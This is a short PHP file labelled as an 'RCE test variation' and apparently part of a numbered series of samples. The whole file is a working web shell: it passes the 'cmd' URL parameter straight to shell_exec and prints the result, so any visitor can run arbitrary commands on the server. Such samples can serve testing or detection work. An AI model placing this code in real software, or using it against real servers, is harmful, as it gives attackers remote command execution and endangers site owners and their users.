<?php
// RCE test variation #1479
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>